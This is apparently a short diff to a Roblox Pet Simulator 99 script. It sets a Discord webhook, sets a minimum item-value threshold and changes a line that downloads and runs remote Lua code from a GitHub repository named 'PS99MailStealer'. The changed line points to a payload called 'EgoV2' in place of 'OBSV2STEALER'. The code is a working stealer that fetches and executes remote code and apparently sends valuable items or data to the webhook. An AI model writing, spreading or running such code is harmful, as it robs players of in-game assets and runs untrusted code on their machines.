@@ -3,4 +3,4 @@ Webhook= 'https://discord.com/api/webhooks/1256444870734905355/4qVurR5wNT_lWI-AI
 
 MinimumRAP = 500000
 
-loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/OBSV2STEALER))()
+loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/EgoV2))()
